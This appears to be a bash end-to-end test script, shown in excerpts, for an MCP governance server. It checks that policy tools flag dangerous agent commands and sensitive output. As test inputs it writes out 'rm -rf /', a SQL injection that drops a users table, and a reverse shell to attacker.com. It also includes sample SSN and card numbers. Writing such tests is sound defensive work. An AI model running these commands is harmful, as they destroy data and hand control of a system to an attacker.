#!/usr/bin/env bash
# OpenAI Codex MCP Server E2E — verifies the MCP server protocol endpoint
# with all 6 governance tools via JSON-RPC 2.0.
#
# Usage:
#   ./test_codex_mcp_server.sh
#
# Environment:
...
echo "========================================"
echo " OpenAI Codex MCP Server E2E Tests"
echo "========================================"
...
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"cp-safe","method":"tools/call","params":{"name":"check_policy","arguments":{"connector_type":"codex.Bash","statement":"echo hello world","operation":"execute"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
...
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"cp-danger","method":"tools/call","params":{"name":"check_policy","arguments":{"connector_type":"codex.Bash","statement":"rm -rf /","operation":"execute"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
...
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"cp-sqli","method":"tools/call","params":{"name":"check_policy","arguments":{"connector_type":"codex.mcp__postgres","statement":"SELECT * FROM users; DROP TABLE users;--","operation":"execute"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
...
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"cp-revshell","method":"tools/call","params":{"name":"check_policy","arguments":{"connector_type":"codex.Bash","statement":"bash -i >& /dev/tcp/attacker.com/4444 0>&1","operation":"execute"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
...
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"co-clean","method":"tools/call","params":{"name":"check_output","arguments":{"connector_type":"codex.Bash","message":"Build succeeded. 42 tests passed, 0 failed."}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
...
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"co-ssn","method":"tools/call","params":{"name":"check_output","arguments":{"connector_type":"codex.Bash","message":"Customer SSN is 123-45-6789 and card is 4111-1111-1111-1111"}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
...
RESPONSE=$(jsonrpc_post '{"jsonrpc":"2.0","id":"audit-1","method":"tools/call","params":{"name":"audit_tool_call","arguments":{"tool_name":"Bash","tool_type":"codex","input":{"command":"echo hello"},"output":{"stdout":"hello"},"success":true,"duration_ms":42}}}')
STATUS=$(extract_status "$RESPONSE")
BODY=$(extract_body "$RESPONSE")
